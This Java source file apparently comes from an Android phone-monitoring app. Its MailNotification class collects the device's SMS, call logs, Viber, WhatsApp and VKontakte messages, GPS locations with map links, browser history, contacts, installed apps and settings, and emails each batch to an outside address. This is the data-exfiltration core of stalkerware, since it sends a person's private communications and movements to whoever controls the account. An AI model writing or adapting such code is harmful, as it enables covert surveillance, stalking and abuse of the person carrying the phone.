package com.dwreload;

import java.io.File;
import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Locale;
import java.util.concurrent.TimeUnit;

import com.dwreload.lib.BrowserHistory;
import com.dwreload.lib.Call;
import com.dwreload.lib.Contact;
import com.dwreload.lib.GPS;
import com.dwreload.lib.IMMessage;
import com.dwreload.lib.IMessageBody;
import com.dwreload.lib.SMS;
import com.dwreload.modules.mail.SendMail;












import org.json.JSONArray;
import org.json.JSONException;

import android.content.Context;
import android.util.Log;


public class MailNotification {
	private Context mContext;
	private String  mPhoneName;
	private ArrayList<File> dummyfile = null;

	public MailNotification(Context context){
		this.mContext = context;
		SettingsManager settings = new SettingsManager(context);
		this.mPhoneName = settings.PhoneName();
	}

	//---------------------------------------------------------------------------------------------------------------------------------------------------------
	public Boolean sendSmsToMail(ArrayList<IMessageBody> list){
		if (list.size() == 0) {
			return true;
		}
		final String[] DIR4 = new String[]  { "", mContext.getString(R.string.insms),  mContext.getString(R.string.outsms),  mContext.getString(R.string.missedsms)};
		SMS obj = null;
		String body = "";
		String subj = "";
		Integer i = list.size();
		Boolean res;
		for (IMessageBody el : list)
			{
			obj = (SMS) el;
			if (obj.type > 3)
				{
				obj.type = 0;
				}
			body =	body.concat(DIR4[obj.type]).concat(": ").concat(obj.number).concat(" (").concat(obj.name).concat(")\r\n")
				.concat(mContext.getString(R.string.timeanddate)).concat(": ").concat(obj.getStringDate()).concat("\r\n")
				.concat(mContext.getString(R.string.smsbody)).concat(": ").concat(obj.text)
				.concat("\r\n-------------------------------\r\n");
			}
		body =	body.concat("\r\n").concat(mContext.getString(R.string.addstring));
		if(i>1)
			{
			subj = "(" + mPhoneName + ") " + mContext.getString(R.string.manysms);
			}
		else
			{
			subj = "(" + mPhoneName + ") " + DIR4[obj.type] + " " + obj.number + "(" + obj.name +")";
			}
		SendMail sm = new SendMail(mContext,dummyfile);
		sm.execute(subj, body);
		try
			{
			res = sm.get(90, TimeUnit.SECONDS);
			} 
		catch (Exception e)
			{
			return false;
			}
		return res;
		}
	//---------------------------------------------------------------------------------------------------------------------------------------------------------
	public Boolean sendCallToMail(ArrayList<IMessageBody> list){
		if (list.size() == 0 ) {
			return true;
		}
		String[] DIR3 = new String[]  { "", mContext.getString(R.string.incall), mContext.getString(R.string.outcall), mContext.getString(R.string.misscall) };
		Call obj = null;
		String body = "";
		String subj = "";
		Integer i = list.size();
		Long min = (long) 0;
		Long sec = (long) 0;
		String length;
		Boolean res;
		for (IMessageBody el : list)
			{
			obj = (Call) el;
			if (obj.type > 3)
				{
				obj.type = 0;
				}
			min = obj.duration/60;
			sec = obj.duration - (min*60);
			if (min > 0) length = (Long.toString(min)).concat(mContext.getString(R.string.minutes)).concat(" ").concat(Long.toString(sec)).concat(mContext.getString(R.string.seconds));
			else if (min == 0) length = (Long.toString(sec)).concat(mContext.getString(R.string.seconds));
			else length = "--:--";
			body =	body.concat(DIR3[obj.type]).concat(": ").concat(obj.number).concat(" (").concat(obj.name).concat(")\r\n")
					.concat(mContext.getString(R.string.timeanddate)).concat(": ").concat(obj.getStringDate()).concat("\r\n");
					if(obj.type<3) body = body.concat(mContext.getString(R.string.calllength)).concat(": ").concat(length).concat("\r\n");
					body = body.concat("-------------------------------\r\n");
			}
		body =	body.concat("\r\n").concat(mContext.getString(R.string.addstring));
		if(i>1)
			{
			subj = "(" + mPhoneName + ") " + mContext.getString(R.string.manycalls);
			}
		else
			{
			subj = "(" + mPhoneName + ") " + DIR3[obj.type] + " " + obj.number + "(" + obj.name +")";
			}
		SendMail sm = new SendMail(mContext,dummyfile);
		sm.execute(subj, body);
		try
			{
			res = sm.get(90, TimeUnit.SECONDS);
			} 
		catch (Exception e)
			{
			Debug.exception(e);
			return false;
			}
		return res;
		}
	//---------------------------------------------------------------------------------------------------------------------------------------------------------
	public Boolean sendSocialToMail(ArrayList<IMessageBody> list, Integer stype){
		//if (list.size() == 0) {
		//	return true;
		//}
		final String[] DIR4 = new String[]  { "", mContext.getString(R.string.insms),  mContext.getString(R.string.outsms)};
		final String[] SocialType = new String[]  { "SocialNet", "Viber",  "Whatsapp", "VKontakte", "OK.RU"};
		IMMessage obj = null;
		String body = "";
		String subj = "";
		Integer i = list.size();
		Boolean res;
		for (IMessageBody el : list)
			{
			obj = (IMMessage) el;
			body =	body.concat(DIR4[obj.type]).concat(": ").concat(obj.name).concat("\r\n")
					.concat(mContext.getString(R.string.timeanddate)).concat(": ").concat(obj.getStringDate()).concat("\r\n")
					.concat(mContext.getString(R.string.smsbody)).concat(": ").concat(obj.text)
					.concat("\r\n-------------------------------\r\n");
			}
		body =	body.concat("\r\n").concat(mContext.getString(R.string.addstring));
		if(i>1)
			{
			subj = "(" + mPhoneName + ")" + SocialType[stype] + " History";
			}
		else
			{
			subj = "("+ SocialType[stype] + " @ " + mPhoneName + ") " + DIR4[obj.type] + " " + obj.name;
			}
		SendMail sm = new SendMail(mContext,dummyfile);
		sm.execute(subj, body);
		try
			{
			res = sm.get(90, TimeUnit.SECONDS);
			} 
		catch (Exception e)
			{
			Debug.exception(e);
			return false;
			}
		return res;
		}
	//---------------------------------------------------------------------------------------------------------------------------------------------------------
	public Boolean sendGPSToMail(ArrayList<IMessageBody> list)
		{
		if (list.size() == 0)
			{
			return true;
			}
		Log.w("GPStoMail", "lets go");
		GPS obj = null;
		String body = "";
		String subj = "";
		SimpleDateFormat sdf = new SimpleDateFormat("dd.MM.yyyy hh:mm",new Locale("ru","RU"));
	    String sDate;
	    String Prov;
		double lat = 0;
		double lon = 0;
		Boolean res;
		Log.w("GPStoMail send: ", "vars init ok");
		for (IMessageBody el : list)
			{
			obj = (GPS) el;
			lat = obj.lat;
			lon = obj.lon;
			Prov = obj.provider;
			sDate = sdf.format(new Date(obj.date));
			body =  body.concat(mContext.getString(R.string.timeanddate)).concat(": ").concat(sDate).concat("\r\n")
					.concat(mContext.getString(R.string.accuracy)).concat(": ").concat(String.valueOf(obj.acc)).concat(" m. (").concat(Prov).concat(")\r\n")
					.concat("https://maps.google.com/maps?q=").concat(String.valueOf(lat)).concat(",").concat(String.valueOf(lon)).concat("&z=14&ll=").concat(String.valueOf(lat)).concat(",").concat(String.valueOf(lon)).concat("&t=k \r\n")
					.concat(mContext.getString(R.string.battery)).concat(": ").concat(String.valueOf(obj.battery)).concat("%\r\n")
					.concat("-------------------------------\r\n");
			}
			subj = "GPS Info from " + mPhoneName;
			Log.w("GPStoMail send: ", body);
			SendMail sm = new SendMail(mContext,dummyfile);
			sm.execute(subj, body);
			try
				{
				res = sm.get(90, TimeUnit.SECONDS);
				} 
			catch (Exception e)
				{
				Log.e("GPStoMail", "Opoops! " + e);
				Debug.exception(e);
				return false;
				}
			return res;
		}
	//---------------------------------------------------------------------------------------------------------------------------------------------------------
	public Boolean sendHistoryToMail(ArrayList<IMessageBody> list){
		if (list.size() == 0)
			{
			return true;
			}		
		BrowserHistory obj = null;
		String body = "";
		String subj = "";
	    String sDate;
	    Boolean res;
		for (IMessageBody el : list)
			{
			obj = (BrowserHistory) el;
			sDate = obj.getStringDate();
			body =  body.concat(mContext.getString(R.string.timeanddate)).concat(": ").concat(sDate).concat("\r\n")
					.concat(obj.url)
					.concat("\r\n-------------------------------\r\n");
						
			}
		subj = "Browser History from " + mPhoneName;
		SendMail sm = new SendMail(mContext,dummyfile);
		sm.execute(subj, body);
		try
			{
			res = sm.get(90, TimeUnit.SECONDS);
			} 
		catch (Exception e)
			{
			Debug.exception(e);
			return false;
			}
		return res;
		}
	//---------------------------------------------------------------------------------------------------------------------------------------------------------
	public Boolean sendContactsToMail(ArrayList<IMessageBody> list){
		if (list.size() == 0)
			{
			return true;
			}		
		Contact obj = null;
		String body = "";
		String subj = "Contacts of " + mPhoneName;
		Boolean res;
		for (IMessageBody el : list)
			{
			obj = (Contact) el;
			body =  body.concat(obj.name).concat("\r\n")
						.concat(obj.number)
						.concat("\r\n-------------------------------\r\n");		
			}
		SendMail sm = new SendMail(mContext,dummyfile);
		sm.execute(subj, body);
		try
			{
			res = sm.get(90, TimeUnit.SECONDS);
			} 
		catch (Exception e)
			{
			Debug.exception(e);
			return false;
			}
		return res;
		}
	//---------------------------------------------------------------------------------------------------------------------------------------------------------
	public Boolean sendApplistToMail(JSONArray list) throws JSONException{
		if (list.length() == 0)
			{
			return false;
			}		
		
		String body = "";
		String subj = "Applist of " + mPhoneName;
		Integer i = list.length();
		Boolean res;
		for (int a = 0; a < i; a++ )
			{
			body =  body.concat(list.getString(a)).concat("\r\n");
			}
		SendMail sm = new SendMail(mContext,dummyfile);
		sm.execute(subj, body);
		try
			{
			res = sm.get(90, TimeUnit.SECONDS);
			} 
		catch (Exception e)
			{
			return false;
			}
		return res;
		}
	//---------------------------------------------------------------------------------------------------------------------------------------------------------
		public void sendOnOffMessage(Boolean onoff, String date)
			{
			
			String subj = mPhoneName + " is switched " + (onoff?"on":"off");
			String body = date + " - " + subj;

			new SendMail(mContext, dummyfile).execute(subj, body);
			}
		//---------------------------------------------------------------------------------------------------------------------------------------------------------
		public void sendSettingsToMail(String settings)
			{	
			String subj = "Settings of " + mPhoneName;
			new SendMail(mContext, dummyfile).execute(subj, settings);
			}
	//====================================================================================================================================================================================================
	
}